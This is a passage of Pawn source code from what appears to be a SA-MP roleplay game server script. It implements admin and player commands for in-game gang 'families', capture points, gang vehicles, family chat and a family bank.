			format(string, sizeof(string), "You have changed '%s' max skins amount to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin1",true) == 0)
		{
			FamilyInfo[family][FamilySkins][0] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #1 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin2",true) == 0)
		{
			FamilyInfo[family][FamilySkins][1] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #2 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin3",true) == 0)
		{
			FamilyInfo[family][FamilySkins][2] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #3 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin4",true) == 0)
		{
			FamilyInfo[family][FamilySkins][3] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #4 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin5",true) == 0)
		{
			FamilyInfo[family][FamilySkins][4] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #5 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin6",true) == 0)
		{
			FamilyInfo[family][FamilySkins][5] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #6 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin7",true) == 0)
		{
			FamilyInfo[family][FamilySkins][6] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #7 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin8",true) == 0)
		{
			FamilyInfo[family][FamilySkins][7] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #8 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "	Not a valid name.");
			return 1;
		}
		SaveFamilies();
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   You're not an Admin!");
		return 1;
	}
	return 1;
}

CMD:fcreate(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pGangMod] > 0 || PlayerInfo[playerid][pAdmin] >= 4) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  			return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new string[128], family, giveplayerid;
		if(sscanf(params, "du", family, giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fcreate [FamilyNr] [playerid/partofname]");
		if(family < 1 || family > 14) { SendClientMessage(playerid, COLOR_GREY, "   Family Slot can't be below 1 or above 14!"); return 1; }

		if(IsPlayerConnected(giveplayerid))
		{
			if(FamilyInfo[family-1][FamilyTaken] == 1)
			{
				SendClientMessage(playerid, COLOR_GREY, "   That Family Slot is already taken!");
				return 1;
			}

			format(string, sizeof(string), "* You've made %s the Leader of Family Slot %d.",GetPlayerNameEx(giveplayerid),family);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* Admin %s has made you a Family Leader.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);

			new sendername[MAX_PLAYER_NAME];
			GetPlayerName(giveplayerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "%s",sendername);
			strmid(FamilyInfo[family-1][FamilyLeader], string, 0, strlen(string), 24);
			FamilyInfo[family-1][FamilyMembers] ++;
			FamilyInfo[family-1][FamilyTaken] = 1;
			PlayerInfo[giveplayerid][pGang] = family-1;
			PlayerInfo[giveplayerid][pRank] = 6;
			SaveFamilies();

		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
			return 1;
		}
	}
	return 1;
}

CMD:fdelete(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pGangMod] > 0 || PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  			return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new family;
		if(sscanf(params, "d", family))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fdelete [familyid]");

		if(family < 1 || family > 14) { SendClientMessage(playerid, COLOR_GREY, "   Family Slot can't be below 1 or above 14!"); return 1; }
		if(FamilyInfo[family-1][FamilyTaken] != 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   That Family Slot isn't taken!");
			return 1;
		}
		ClearFamily(family-1);
		SaveFamilies();
	}
	return 1;
}

CMD:pedit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use this command!!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}

	new string[128], hours;
	if(sscanf(params, "d", hours))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /pedit [hours]");
		SendClientMessage(playerid, COLOR_GREY, "HINT: Stand close to a point to set the hours.");
		return 1;
	}

	for(new h = 0; h < sizeof(Points); h++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz]))
		{
			if(hours < 1|| hours > 24)
			{
				SendClientMessage(playerid, COLOR_GREY, "You can't set the point time lower than 1 or higher than 24!");
			}
			else if(hours >= 1|| hours <= 24)
			{
				format(string, sizeof(string), "You have set this point's time to %d hours!", hours);
				Points[h][Vulnerable] = hours;
				SendClientMessage(playerid, COLOR_WHITE, string);
				UpdatePoints();
			}
		}
	}
	return 1;
}

CMD:disablepoint(playerid, params[])
{ // TEMPORARY COMMAND - REMOVE LATER
	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use this command!!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}
	for(new h = 0; h < sizeof(Points); h++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz]))
		{
			strmid(Points[h][Owner], "Nobody", 0, 32, 32);
			strmid(Points[h][CapperName], "Nobody", 0, 32, 32);
			Points[h][Vulnerable] = -1;
			SendClientMessage(playerid, COLOR_WHITE, "You have disabled this point.");
			UpdatePoints();
		}
	}
	return 1;
}

CMD:pointfix(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use this command!!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}

	for(new h = 0; h < sizeof(Points); h++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz]))
		{
			Points[h][TimeToClaim] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "You have fixed the point, players can now attempt to capture the point!");
			UpdatePoints();
			return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, "Error: You need to stand close to the capture point to fix it.");
	return 1;
}

CMD:creategvehicle(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pGangMod] > 0 || PlayerInfo[playerid][pAdmin] >= 4) {
		new
			string[128],
			family,
			modelid,
			color1,
			color2;

		if(sscanf(params, "dddd", family, modelid, color1, color2))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /creategvehicle [familyid] [modelid] [color 1] [color 2]");

	   	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	  		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	   	if(family < 1 || family > MAX_FAMILY) { SendClientMessage(playerid, COLOR_GREY, "   FamilyNr can't be below 1 or above 14!"); return 1; }
		family -= 1;
		if(FamilyInfo[family][FamilyTaken] != 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   That FamilyNr hasn't been Taken yet!");
			return 1;
		}
		if(color1 < 0 || color1 > 255) { SendClientMessage(playerid, COLOR_GREY, "   Color Number can't be below 0 or above 255!"); return 1; }
		if(color2 < 0 || color2 > 255) { SendClientMessage(playerid, COLOR_GREY, "   Color Number can't be below 0 or above 255!"); return 1; }
		if(modelid < 400 || modelid > 611) { SendClientMessage(playerid, COLOR_GREY, "   Vehicle Number can't be below 400 or above 611!"); return 1; }
		new gangvehicleid = GetGangFreeVehicleId(family);
		if(gangvehicleid == -1) return SendClientMessage(playerid, COLOR_GREY, "ERROR: That family can't have more cars.");
		new Float:X,Float:Y,Float:Z;
	 	GetPlayerPos(playerid,X,Y,Z);
	  	new Float:Angle;
	   	GetPlayerFacingAngle(playerid,Angle);
	   	new car = CreateGangVehicle(family, gangvehicleid, modelid, X, Y, Z, Angle, color1, color2, 0);
	   	if(car == INVALID_VEHICLE_ID) {
	 		SendClientMessage(playerid, COLOR_GREY, "ERROR: Something went wrong and the car didn't got created.");
		}
	 	else
	  	{
	   		format(string, sizeof(string), " Vehicle successfully created with ID %d.", car);
	    	SendClientMessage(playerid, COLOR_GRAD1, string);
		    SaveFamiliesHQ();
		}
	}
	return 1;
}

CMD:destroygvehicle(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pGangMod] > 0 || PlayerInfo[playerid][pAdmin] >= 4) {
		new
			family,
			vehicleid;
		if(sscanf(params, "dd", family, vehicleid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /destroygvehicle [familyid] [vehicleid]");

	   	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	 	{
	  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	   	}

	    if(family < 1 || family > MAX_FAMILY) { SendClientMessage(playerid, COLOR_GREY, "   FamilyNr can't be below 1 or above 14!"); return 1; }
		family -= 1;
		new gangvehicleid = GetGangVehicle(family, vehicleid);
		if(gangvehicleid == -1) return SendClientMessage(playerid, COLOR_GREY, "ERROR: That family doesn't own that vehicle.");
		DestroyGangVehicle(family, gangvehicleid);
		SaveFamiliesHQ();
	}
	return 1;
}

#if defined TREASURE_HUNT_ENABLED
CMD:gotohuntpos(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 5) {
		SetPlayerPos(playerid, fTreasureHuntLS[iHuntLocation][0], fTreasureHuntLS[iHuntLocation][1], fTreasureHuntLS[iHuntLocation][2]);

		SendClientMessage(playerid, COLOR_WHITE, "You have teleported to the treasure hunt location.");
	}
	return 1;
}

CMD:resethuntpos(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 5) {
		SetRandomHuntPos();

		SendClientMessage(playerid, COLOR_WHITE, "You have reset the treasure hunt location.");
	}
	return 1;
}
#endif

CMD:gtrackcar(playerid, params[])
{
	if(PlayerInfo[playerid][pGang] == 255) return SendClientMessage(playerid, COLOR_GRAD1, "You need to be in a family for this command.");
	new vstring[1024];
	for(new i = 0; i < MAX_GANG_VEHICLES; i++)
	{
		if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId] != INVALID_VEHICLE_ID)
		{
		    if(PlayerInfo[playerid][pAdmin] >= 2)
		    {
		        format(vstring, sizeof(vstring), "%s\n%s (ID: %d)", vstring, VehicleName[FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvModelId] - 400], FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId]);
		    }
		    else
		    {
				format(vstring, sizeof(vstring), "%s\n%s", vstring, VehicleName[FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvModelId] - 400]);
			}
		}
		else if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvImpounded] == 1) {
			format(vstring, sizeof(vstring), "%s\n%s (impounded)", vstring, VehicleName[FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvModelId] - 400]);
		}
		else
		{
			format(vstring, sizeof(vstring), "%s\nEmpty", vstring);
		}
	}
	return ShowPlayerDialogEx(playerid, GTRACKCAR, DIALOG_STYLE_LIST, "Vehicle GPS Tracking", vstring, "Track", "Cancel");
}

CMD:togfamily(playerid, params[])
{
	return cmd_togfam(playerid, params);
}

CMD:tognews(playerid, params[])
{
	if(!gNews[playerid])
	{
		gNews[playerid] = 1;
		SendClientMessage(playerid, COLOR_GRAD2, "You have disabled news chat.");
	}
	else
	{
		gNews[playerid] = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "You have enabled news chat.");
	}
	return 1;
}

CMD:tognewbie(playerid, params[])
{
	if(!gNewbie[playerid])
	{
		gNewbie[playerid] = 1;
		SendClientMessage(playerid, COLOR_GRAD2, "You have disabled newbie chat.");
	}
	else
	{
		gNewbie[playerid] = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "You have enabled newbie chat.");
	}
	return 1;
}

CMD:togfam(playerid, params[])
{
	if(!gFam[playerid])
	{
		gFam[playerid] = 1;
		SendClientMessage(playerid, COLOR_GRAD2, "You have disabled family chat.");
	}
	else
	{
		gFam[playerid] = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "You have enabled family chat.");
	}
	return 1;
}

CMD:f(playerid, params[]) {
	if(gFam[playerid] == 1)
		return SendClientMessage(playerid, TEAM_CYAN_COLOR, "You have your family chat disabled; /togfamily!");

	new string[128];

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: (/f)amily [family chat]");

	if(PlayerCuffed[playerid] > 0 || GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_GREY, "You can't talk over /f while you're cuffed, hospitalized or tazed.");

	if((PlayerInfo[playerid][pFaction] == 4) || PlayerInfo[playerid][pGang] < 255) {
		new member = PlayerInfo[playerid][pFaction];
		new fam = PlayerInfo[playerid][pGang];
		if(member==4) {
			if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (6) Director %s: %s **", GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (5) Vice Director %s: %s **", GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (4) Special Agent %s: %s **", GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (3) Agent %s: %s **", GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (2) Marksman %s: %s **", GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (1) Freelancer %s: %s **", GetPlayerNameEx(playerid), params); }
			else { format(string, sizeof(string), "** (1) Freelancer %s: %s **", GetPlayerNameEx(playerid), params); }
			SendFamilyMessage(PlayerInfo[playerid][pFaction], TEAM_AZTECAS_COLOR, string);
		}
		else if(PlayerInfo[playerid][pGang] < 255) {
			if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (6) %s %s: %s **", FamilyInfo[fam][FamilyRank6], GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (5) %s %s: %s **", FamilyInfo[fam][FamilyRank5], GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (4) %s %s: %s  **", FamilyInfo[fam][FamilyRank4], GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (3) %s %s: %s  **", FamilyInfo[fam][FamilyRank3], GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (2) %s %s: %s  **", FamilyInfo[fam][FamilyRank2], GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (1) %s %s: %s  **", FamilyInfo[fam][FamilyRank1], GetPlayerNameEx(playerid), params); }
			else { format(string, sizeof(string), "** (0) %s %s: %s **", FamilyInfo[fam][FamilyRank1], GetPlayerNameEx(playerid), params); }
			SendNewFamilyMessage(PlayerInfo[playerid][pGang], TEAM_AZTECAS_COLOR, string);
		}
		return 1;
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You're not a part of a Family!");

	return 1;
}

CMD:quitfaction(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction] >= 1 || PlayerInfo[playerid][pLeader] >= 1) {
		SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You have quit your faction, you're now a civilian again.");
		new string[128];
		format(string, sizeof(string), "%s has quit the %s as a rank %i", GetPlayerNameEx(playerid), GetFactionName(PlayerInfo[playerid][pFaction]), PlayerInfo[playerid][pRank]);
		Log("logs/faction.log", string);
		PlayerInfo[playerid][pFaction] = 0;
		PlayerInfo[playerid][pRank] = 0;
		PlayerInfo[playerid][pDuty] = 0;
		PlayerInfo[playerid][pLeader] = 0;
		PlayerInfo[playerid][pDivision] = 0;
		if(!IsValidSkin(GetPlayerSkin(playerid))) {
  			new rand = random(sizeof(CIV));
			SetPlayerSkin(playerid,CIV[rand]);
			PlayerInfo[playerid][pSkin] = CIV[rand];
		}
		SetPlayerToTeamColor(playerid);
		player_remove_vip_toys(playerid);
   		pTazer[playerid] = 0;
		if(TalkingLive[playerid] != INVALID_PLAYER_ID || LiveOffer[playerid] != INVALID_PLAYER_ID ) {
			TalkingLive[TalkingLive[playerid]] = INVALID_PLAYER_ID;
			TalkingLive[LiveOffer[playerid]] = INVALID_PLAYER_ID;
			LiveOffer[LiveOffer[playerid]] = INVALID_PLAYER_ID;
			LiveOffer[TalkingLive[playerid]] = INVALID_PLAYER_ID;
		}
		TalkingLive[playerid] = INVALID_PLAYER_ID;
		LiveOffer[playerid] = INVALID_PLAYER_ID;
		Backup[playerid] = 0;
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not in a faction.");
	return 1;
}

CMD:quitfamily(playerid, params[]) {
	return cmd_quitgang(playerid, params);
}

CMD:quitgang(playerid, params[])
{
    if(PlayerInfo[playerid][pGang] != 255)
	{
		for (new x = 0; x < MAX_POINTS; x++)
		{
			if(Points[x][ClaimerId] == playerid)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "You can't leave a family while you're capturing a point.");
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You have quit the family, you're now a civilian again.");
		new string[128];
		format(string, sizeof(string), "%s has quit family %d as rank %i", GetPlayerNameEx(playerid), PlayerInfo[playerid][pGang]+1, PlayerInfo[playerid][pRank]);
		Log("logs/family.log", string);
		PlayerInfo[playerid][pGang] = 255;
		PlayerInfo[playerid][pRank] = 0;
		if(!IsValidSkin(GetPlayerSkin(playerid)))
		{
		    new rand = random(sizeof(CIV));
			SetPlayerSkin(playerid,CIV[rand]);
			PlayerInfo[playerid][pSkin] = CIV[rand];
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not in a family.");
	}
	return 1;
}

CMD:safehelp(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN, "_______________________________________________");
	SendClientMessage(playerid, COLOR_WHITE, "SAFE HELP: Type a command for more information.");
	SendClientMessage(playerid, COLOR_WHITE, "SAFE: /safebalance /safedeposit /safewithdraw /fstoregun /fgetgun.");
	return 1;
}

CMD:safebalance(playerid, params[]) {
	if(PlayerInfo[playerid][pGang] < 255) {
		if(FamilyInfo[PlayerInfo[playerid][pGang]][FamilyUSafe] < 1) {
			SendClientMessage(playerid, COLOR_GRAD1, "Your family doesn't have a safe.");
		}
		else
		{
			new string[128];

			new weaponsinlocker;
			for(new s = 0; s < 10; s++)
			{
				if(FamilyInfo[PlayerInfo[playerid][pGang]][FamilyGuns][s] != 0)
				{
					weaponsinlocker++;
				}
			}

			format(string, sizeof(string), " Safe: %s | Gunlockers: %d/10 | Cash: $%d | Pot: %d | Crack: %d | Materials: %d", FamilyInfo[PlayerInfo[playerid][pGang]][FamilyName], weaponsinlocker, FamilyInfo[PlayerInfo[playerid][pGang]][FamilyCash], FamilyInfo[PlayerInfo[playerid][pGang]][FamilyPot], FamilyInfo[PlayerInfo[playerid][pGang]][FamilyCrack], FamilyInfo[PlayerInfo[playerid][pGang]][FamilyMats]);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not in a family.");
	return 1;
}

CMD:families(playerid, params[])
{
	new string[128], familyid;

	if(sscanf(params, "d", familyid))
	{
		new number = 0;
		for(new i = 0; i < sizeof(FamilyInfo); i++)
		{
			number ++;
			format(string, sizeof(string), "Family %d | Name: %s | Leader: %s | Members: %d",number,FamilyInfo[i][FamilyName],FamilyInfo[i][FamilyLeader],FamilyInfo[i][FamilyMembers]);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		return 1;
	}

	if(familyid < 1 || familyid > MAX_FAMILY) { SendClientMessage(playerid, COLOR_GREY, "Family slot must be between 1 and 14."); return 1; }
	familyid -= 1;
	if(FamilyInfo[familyid][FamilyTaken] != 1)
	{
		SendClientMessage(playerid, COLOR_GREY, "That family slot is empty.");
		return 1;
	}
	foreach(Player, i)
	{
		if(PlayerInfo[i][pGang] == familyid && (AdminDuty[i] != 1))
		{
			if(PlayerInfo[i][pRank] == 1)
			{
				format(string, sizeof(string), "* %s: %s | Rank: %s (1).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank1]);
			}
			else if(PlayerInfo[i][pRank] == 2)
			{
				format(string, sizeof(string), "* %s: %s | Rank: %s (2).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank2]);
			}
			else if(PlayerInfo[i][pRank] == 3)
			{
				format(string, sizeof(string), "* %s: %s | Rank: %s (3).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank3]);
			}
			else if(PlayerInfo[i][pRank] == 4)
			{
				format(string, sizeof(string), "* %s: %s | Rank: %s (4).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank4]);
			}
			else if(PlayerInfo[i][pRank] == 5)
			{
				format(string, sizeof(string), "* %s: %s | Rank: %s (5).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank5]);
			}
			else if(PlayerInfo[i][pRank] == 6)
			{
				format(string, sizeof(string), "* %s: %s | Rank: %s (6).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank6]);
			}
			else
			{
				format(string, sizeof(string), "* %s: %s | Rank: %s.",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank1]);
			}
			SendClientMessage(playerid, COLOR_GREY, string);
		}
	}
	return 1;
}

CMD:fbalance(playerid, params[])
{
	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the bank!");
		return 1;
	}

	new family, string[128];
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not in a family.");
		return 1;
	}

	format(string, sizeof(string), "Your family has $%d in their account.", FamilyInfo[family][FamilyBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}

CMD:fdeposit(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the bank!");
		return 1;
	}

	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not in a family.");
		return 1;
	}

	new string[128], amount;
	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fdeposit [amount]");
		format(string, sizeof(string), "Your family has $%d in their account.", FamilyInfo[family][FamilyBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > GetPlayerCash(playerid) || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much.");
		return 1;
	}
	GivePlayerCash(playerid,-amount);
	new curfunds = FamilyInfo[family][FamilyBank];
	FamilyInfo[family][FamilyBank]=amount+FamilyInfo[family][FamilyBank];
	SendClientMessage(playerid, COLOR_WHITE, "|___ FAMILY BANK STATEMENT ___|");
	format(string, sizeof(string), "  Old balance: $%d", curfunds);
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "  Deposit: $%d",amount);
	SendClientMessage(playerid, COLOR_GRAD4, string);
	SendClientMessage(playerid, COLOR_GRAD6, "|-----------------------------------------|");
	format(string, sizeof(string), "  New balance: $%d", FamilyInfo[family][FamilyBank]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	new ip[32];
	GetPlayerIp(playerid, ip, sizeof(ip));
	format(string,sizeof(string),"%s (IP: %s) has deposited $%d into family %d's bank account.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]+1);
	Log("logs/family.log", string);
	return 1;
}

CMD:fwithdraw(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the bank!");
		return 1;
	}
	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not in a family.");
		return 1;
	}
	if(PlayerInfo[playerid][pRank] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Only ranks five and six may use the family bank.");
		return 1;
	}

	new string[128], amount;
	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fwithdraw [amount]");
		format(string, sizeof(string), "Your family has $%d in their account.", FamilyInfo[family][FamilyBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > FamilyInfo[family][FamilyBank] || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Your family doesn't have that much.");
		return 1;
	}

	GivePlayerCash(playerid,amount);
	FamilyInfo[family][FamilyBank]=FamilyInfo[family][FamilyBank]-amount;
	format(string, sizeof(string), "  You have withdrawn $%d from your family account. Total: $%d", amount,FamilyInfo[family][FamilyBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	new ip[32];
	GetPlayerIp(playerid, ip, sizeof(ip));
	format(string,sizeof(string),"%s (IP: %s) has withdrawn $%d from family %d's bank account.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]+1);
	Log("logs/family.log", string);
	return 1;
}

CMD:fstoregun(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(GetPVarInt(playerid, "PBM") > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");
		return 1;
	}
	if(GetPVarInt(playerid, "EventToken") != 0)
 	{
		SendClientMessage(playerid, COLOR_GREY, "You can't use this while you're in an event.");
		return 1;
	}
	/*if(PlayerInfo[playerid][pVip] > 2)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You can't give away weapons if you're Gold+ VIP!");
		return 1;
	}*/
	if(IsPlayerInAnyVehicle(playerid))
 {
		SendClientMessage (playerid, COLOR_GRAD2, "You can't store weapons from a vehicle!");
		return 1;
	}
	new Float:health;
	GetPlayerHealth(playerid, health);
	if(health < 80)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You can't store weapons if your health is below 80!");
		return 1;
	}
	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0||GetPlayerState(playerid) == 7)
	{
		SendClientMessage (playerid, COLOR_GRAD2, "You can't do this at this time.");
		return 1;
	}
